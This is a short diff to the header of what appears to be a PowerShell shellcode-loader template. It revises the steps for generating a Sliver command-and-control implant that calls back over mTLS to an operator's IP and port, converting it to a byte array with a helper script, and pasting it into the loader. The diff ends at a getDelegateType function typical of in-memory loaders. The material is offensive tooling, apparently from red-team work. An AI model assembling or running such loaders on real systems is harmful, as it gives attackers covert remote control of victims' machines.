@@ -1,10 +1,11 @@
 # =============================================================================
 # TEMPLATE — replace $buf with your actual shellcode before running
 #
-# Generate shellcode (Sliver):
-#   sliver > generate --mtls <IP>:<PORT> --format ps1 --save /tmp/sc.ps1
+# Generate shellcode (Sliver) and convert to a PowerShell byte array:
+#   sliver > generate --mtls <IP>:<PORT> --format shellcode --save /tmp/sc.bin
+#   python3 sliver/sliver2arrays.py /tmp/sc.bin --ps1
 #
-# Then replace the $buf line below with the full byte array from Sliver output.
+# Then replace the $buf line below with the full byte array from that output.
 # =============================================================================
 
 function getDelegateType {
